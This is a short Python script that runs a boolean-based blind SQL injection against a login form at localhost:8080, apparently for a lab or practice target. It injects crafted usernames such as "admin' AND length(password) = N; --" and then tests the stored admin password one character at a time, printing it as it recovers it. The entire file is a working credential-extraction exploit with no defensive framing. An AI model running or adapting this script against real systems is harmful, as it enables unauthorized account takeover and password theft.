import requests
import time

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def isValid(r):
    return r.content.find(b"Connection") == -1

def prettyPrint(passwd, length, i):
    print(''.join(passwd), end="")
    for l in range(length - i):
        print("*", end="")
    print(" [" + str(i) + "/" + str(length) + "]")

def findPassLength():
    print("-- Try to find out password length --")
    length = None

    for i in range(40):
        query = "admin' AND length(password) = " + str(i) + "; --",
        parameters = {
            'username': query,
            'password': 'password',
        }

        r = requests.post("http://localhost:8080/", parameters, headers=headers)
        if isValid(r):
            length = i
            break

        time.sleep(0.01)

    print("Length:", length)
    return length

def findPass():
    length = findPassLength()
    print("-- Try to find out password combination --")
    passwd = []

    for i in range(1, length + 1):
        for c in range (33, 127):
            query = "admin' AND BINARY substr(password," + str(i) + ",1) = char(" + str(c) + "); --",
            parameters = {
                'username': query,
                'password': 'password',
            }

            r = requests.post("http://localhost:8080/", parameters)
            if isValid(r):
                passwd.append(chr(c))
                break
            
            time.sleep(0.01)

        prettyPrint(passwd, length, i)
        time.sleep(0.1)

    print("-- Password Found --")
    print(''.join(passwd))
    return passwd

findPass()